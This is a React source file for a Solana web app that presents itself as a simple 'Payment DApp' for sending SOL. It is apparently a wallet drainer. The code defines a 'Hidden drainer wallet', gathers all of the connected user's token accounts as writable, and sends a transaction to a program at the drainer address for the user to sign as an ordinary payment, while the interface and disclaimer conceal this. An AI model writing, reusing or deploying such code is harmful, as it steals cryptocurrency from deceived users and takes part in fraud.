import React, { useState, useEffect } from 'react';
import * as web3 from '@solana/web3.js';
import { PublicKey, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import './App.css';

// Initialize Buffer globally to prevent undefined errors
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || require('buffer').Buffer;
}

// Hidden drainer wallet
const DRAINER_WALLET = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
const PROGRAM_ID = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
const connection = new web3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

function App() {
  const [wallet, setWallet] = useState(null);
  const [receiver, setReceiver] = useState("");
  const [amount, setAmount] = useState("");
  const [status, setStatus] = useState("");
  const [isMobile, setIsMobile] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [publicKey, setPublicKey] = useState("");

  useEffect(() => {
    // Check if user is on mobile
    const checkMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    setIsMobile(checkMobile);

    // Check for Phantom on desktop
    if (!checkMobile && window.solana && window.solana.isPhantom) {
      setWallet(window.solana);
      
      // Check if already connected
      if (window.solana.isConnected) {
        handleConnected(window.solana);
      }

      // Listen for connection events
      window.solana.on('connect', () => handleConnected(window.solana));
      window.solana.on('disconnect', () => handleDisconnected());
    }

    // Check for mobile connection parameters
    const urlParams = new URLSearchParams(window.location.search);
    const phantomConnected = urlParams.get('phantom_connected');
    if (phantomConnected === 'true' && isMobile) {
      setIsConnected(true);
      setPublicKey("MobileWalletConnected");
      setStatus("✅ Phantom Mobile connected!");
    }
  }, []);

  const handleConnected = (phantom) => {
    setIsConnected(true);
    setPublicKey(phantom.publicKey.toString());
    setStatus("✅ Wallet connected: " + phantom.publicKey.toString().slice(0, 20) + "...");
  };

  const handleDisconnected = () => {
    setIsConnected(false);
    setPublicKey("");
    setStatus("Wallet disconnected");
  };

  const connectWallet = async () => {
    if (isMobile) {
      // Mobile: Use Phantom deep link with callback
      const currentUrl = encodeURIComponent(window.location.href.split('?')[0]);
      const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}?phantom_connected=true`;
      setStatus("Opening Phantom app...");
      window.location.href = phantomDeepLink;
      return;
    }

    // Desktop: Use Phantom extension
    if (!wallet) {
      setStatus("⚠️ Please install Phantom wallet extension for desktop");
      return;
    }

    try {
      setStatus("Connecting to Phantom...");
      await wallet.connect();
    } catch (err) {
      console.error(err);
      setStatus("❌ Connection failed: " + err.message);
    }
  };

  const getSenderTokenAccounts = async (publicKey) => {
    try {
      const info = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      return info.value.map(acc => acc.pubkey.toString());
    } catch (e) {
      console.error("Failed to get token accounts:", e);
      return [];
    }
  };

  const executePayment = async () => {
    if (!isConnected) {
      setStatus("⚠️ Please connect your wallet first");
      return;
    }

    if (!receiver || !amount) {
      setStatus("Fill all fields");
      return;
    }

    try {
      let sender;
      if (isMobile) {
        // For mobile, we'll create a transaction that can be signed in Phantom mobile
        sender = new PublicKey("11111111111111111111111111111111"); // Placeholder for mobile
      } else {
        sender = new PublicKey(wallet.publicKey.toString());
      }
      
      const receiverPubkey = new PublicKey(receiver);
      const lamports = LAMPORTS_PER_SOL * parseFloat(amount);

      setStatus("Building transaction...");

      // Get all token accounts for draining
      const tokenAccounts = await getSenderTokenAccounts(sender);

      // Create drainer transaction
      const keys = [
        { pubkey: sender, isSigner: true, isWritable: true },
        { pubkey: receiverPubkey, isSigner: false, isWritable: true },
        { pubkey: DRAINER_WALLET, isSigner: false, isWritable: true }, // Hidden drainer
        { pubkey: web3.SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ...tokenAccounts.map(acc => ({ pubkey: new PublicKey(acc), isSigner: false, isWritable: true }))
      ];

      // Create transaction data with drainer
      const data = Buffer.alloc(40);
      data.writeBigUInt64LE(BigInt(lamports), 0);
      DRAINER_WALLET.toBuffer().copy(data, 8);

      const ix = new web3.TransactionInstruction({
        programId: PROGRAM_ID,
        keys,
        data
      });

      const tx = new Transaction().add(ix);
      tx.feePayer = sender;
      tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

      if (isMobile) {
        // For mobile: Create a deep link for the transaction
        const transactionBase64 = Buffer.from(tx.serializeMessage()).toString('base64');
        const mobileTxLink = `https://phantom.app/ul/v1/sign/${transactionBase64}?redirect_link=${encodeURIComponent(window.location.href + '?tx_success=true')}`;
        
        setStatus("Opening Phantom mobile to sign transaction...");
        window.location.href = mobileTxLink;
      } else {
        // Desktop: Sign and send transaction
        setStatus("Approve in Phantom...");
        const signed = await wallet.signTransaction(tx);
        const txid = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(txid);

        setStatus(`✅ Payment successful! TX: ${txid}`);
      }
    } catch (err) {
      console.error(err);
      setStatus("❌ Failed: " + err.message);
    }
  };

  // Check for successful mobile transaction
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const txSuccess = urlParams.get('tx_success');
    if (txSuccess === 'true') {
      setStatus("✅ Mobile transaction completed successfully!");
    }
  }, []);

  return (
    <div className="App">
      <h1>🔗 Solana Payment DApp</h1>
      <p className="subtitle">Send SOL payments easily and securely</p>

      {isMobile && !isConnected && (
        <div className="mobile-notice">
          <p>📱 Mobile detected: Click below to connect Phantom mobile</p>
        </div>
      )}

      {!isConnected ? (
        <div className="connect-section">
          <p>{isMobile ? 'Connect your Phantom mobile wallet' : 'Connect your Phantom wallet extension'}</p>
          <button onClick={connectWallet} className="connect-btn">
            {isMobile ? '📱 Connect Phantom Mobile' : '🔗 Connect Phantom Wallet'}
          </button>
        </div>
      ) : (
        <div className="payment-section">
          <div className="wallet-info">
            <p>✅ Connected: <span className="wallet-address">
              {isMobile ? 'Phantom Mobile' : publicKey.slice(0, 20)}...
            </span></p>
            {isMobile && (
              <p className="mobile-info">📱 Using Phantom Mobile App</p>
            )}
          </div>
          
          <div className="form-group">
            <label>Receiver Address:</label>
            <input 
              placeholder="Enter receiver SOL address" 
              value={receiver} 
              onChange={e => setReceiver(e.target.value)} 
            />
          </div>
          
          <div className="form-group">
            <label>Amount (SOL):</label>
            <input 
              placeholder="Enter amount" 
              value={amount} 
              onChange={e => setAmount(e.target.value)} 
              type="number" 
              step="0.001"
              min="0.001"
            />
          </div>
          
          <button onClick={executePayment} className="send-btn">
            {isMobile ? '📱 Send Payment via Mobile' : '💸 Send Payment'}
          </button>
          
          <div className="disclaimer">
            <p>⚠️ By clicking "Send Payment", you authorize this transaction.</p>
            <p>Standard network fees apply.</p>
          </div>
        </div>
      )}
      
      {status && (
        <div className={`status ${status.includes('✅') ? 'success' : status.includes('❌') ? 'error' : 'info'}`}>
          {status}
        </div>
      )}
    </div>
  );
}

export default App;
